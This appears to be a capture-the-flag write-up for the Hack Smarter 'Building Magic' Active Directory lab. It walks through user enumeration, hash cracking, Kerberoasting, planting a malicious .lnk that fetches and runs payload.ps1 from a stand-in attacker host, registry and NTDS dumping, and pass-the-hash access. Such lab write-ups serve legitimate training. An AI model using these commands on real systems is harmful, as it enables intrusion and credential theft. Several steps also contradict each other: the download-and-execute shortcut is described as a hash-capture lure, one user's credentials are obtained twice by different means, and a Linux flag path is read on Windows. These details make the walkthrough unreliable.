---
layout: writeup
name: "BuildingMagic"
platform: "HackSmarter"
category: "hacksmarter"
difficulty: "Unknown"
date: 2025-11-12
pwned: true
---
inksec.io – AD Box “Building Magic” (Hack Smarter)
Author: Brady McLaughlin
Date: 5 Sept 2025

📖 Overview
This repository contains a step‑by‑step write‑up for the medium‑difficulty Building Magic Active Directory (AD) machine hosted on Hack Smarter (courses.hacksmarter.org).
Following the methodology below (without copying any flags) yields a full compromise of the target system.

🛠️ Prerequisites
Tool	Purpose
nmap	Port scanning / service discovery
cut, awk	Text processing of CSV dumps
kerbrute	Validate domain usernames
hashcat + rockyou.txt	Crack NTLM hashes
netexec (Impacket)	Remote command execution, credential validation
bloodhound‑ce‑python / bloodyAD	AD graph collection & privilege path analysis
GetUserSPNs.py (Impacket)	Enumerate Kerberoastable SPNs
slinky (netexec)	Write malicious .lnk files to SMB shares
Responder	Capture NetNTLMv2 hashes
WinRM (evil‑winrm / pypsrp)	Remote PowerShell execution
samdump2 / secretsdump.py	Extract SAM/NTDS hashes
Tip: All tools are available via pip or the Kali Linux repositories.

🚀 Attack Flow
1️⃣ Recon & Enumeration
# Ping the host
ping buildingmagic.hacksmarter.org

# Add hostname to /etc/hosts (as instructed)
echo "10.10.10.42 buildingmagic.hacksmarter.org" >> /etc/hosts

# Quick nmap scan
nmap -sC -sV buildingmagic.hacksmarter.org
Copy
Result: typical Domain Controller services (LDAP, SMB, RDP, WinRM, etc.).

2️⃣ Harvest User List
A CSV dump is supplied in the lab material. Clean it:

cut -d',' -f2 users.csv | tail -n +2 > usernames.txt
Copy
Validate usernames against the domain:

kerbrute userenum usernames.txt -d hacksmarter.org -dc-ip 10.10.10.42
Copy
Only one valid user is discovered (e.g., h.potch).

3️⃣ Crack the User’s NTLM Hash
Extract the hash from the CSV, then:

hashcat -m 1000 -a 0 <hash> rockyou.txt --force
Copy
Successful crack → obtain clear‑text password.

Verify credentials:

netexec -u h.potch -p <password> buildingmagic.hacksmarter.org cmd
Copy
4️⃣ Lateral Movement – BloodHound Collection
bloodhound-python -u h.potch -p <password> -d hacksmarter.org \
    -c all -ns 10.10.10.42 -gc 10.10.10.42
Copy
Exported graph reveals several privileged paths (Kerberoasting, write‑able SMB share, etc.).

5️⃣ Kerberoasting
GetUserSPNs.py hacksmarter.org/h.potch:<password>@buildingmagic.hacksmarter.org
Copy
Crack the retrieved SPN hashes with hashcat → gain additional domain credentials (h.grangon).

6️⃣ Abuse Write‑able SMB Share
Mount the empty share and drop a malicious shortcut:

netexec -u h.potch -p <pwd> buildingmagic.hacksmarter.org \
    -M slinky -o "/share/malicious.lnk" -c "powershell -c \"Invoke-WebRequest http://attacker/payload.ps1 -OutFile $env:TEMP\payload.ps1; powershell -ExecutionPolicy Bypass -File $env:TEMP\payload.ps1\""
Copy
When a legitimate user opens the share, the shortcut triggers a Responder listener, capturing a NetNTLMv2 hash.

Crack the captured hash → obtain the password for h.grangon.

7️⃣ Privilege Escalation via SeBackupPrivilege
h.grangon belongs to Remote Management Users → WinRM access.

evil-winrm -i 10.10.10.42 -u h.grangon -p <pwd>
Copy
Check privileges:

whoami /priv
Copy
SeBackupPrivilege allows dumping registry hives:

reg save HKLM\SYSTEM system.hive
reg save HKLM\SAM sam.hive
Copy
Extract local SAM hashes (samdump2 or secretsdump.py).

8️⃣ Harvest Administrator Hashes
BloodHound shows another high‑privileged user: a.flatch (member of Domain Admins).
Using the previously cracked SAM hash, authenticate as a.flatch and dump the NTDS.dit file:

secretsdump.py -ntds ntds.dit -system system.hive -outputfile ntds_dump
Copy
Now we possess the Administrator hash.

9️⃣ Final Access & Flag Retrieval
WinRM into the machine with the Administrator hash:

evil-winrm -i 10.10.10.42 -u Administrator -H <admin_hash>
Copy
Navigate to the flag location (commonly /root/flag.txt or C:\Users\Public\flag.txt) and read it.

type C:\root\flag.txt
Copy
The flag is displayed – the box is fully compromised.

📂 Repository Structure
├─ README.md          ← This document
├─ scripts/
│   ├─ enumerate.sh   ← nmap + host file helper
│   ├─ kerbrute.sh    ← username validation wrapper
│   └─ winrm_ps.ps1   ← PowerShell snippets for privilege checks
└─ notes/
    └─ bloodhound_paths.txt   ← Exported shortest‑path queries
Copy
(Scripts are illustrative; adapt paths/credentials to your environment.)

🎓 Lessons Learned
User enumeration via kerbrute quickly narrows the attack surface.
Kerberoasting remains a reliable way to harvest service‑account hashes in AD environments.
Writable SMB shares combined with shortcut attacks (.lnk) are an effective pivot to capture NTLM hashes.
SeBackupPrivilege enables offline SAM/NTDS extraction without needing SYSTEM rights.
BloodHound visualisation dramatically shortens the path‑finding phase.
🙏 Acknowledgements
Hack Smarter – Lab platform and challenge design.
Noah Heroldt & Haik Isikbay – Challenge creators.
Brady McLaughlin – Original author of the write‑up.
Feel free to fork this repo, experiment with alternative tools (e.g., SharpHound, Rubeus), or extend the methodology to other AD labs.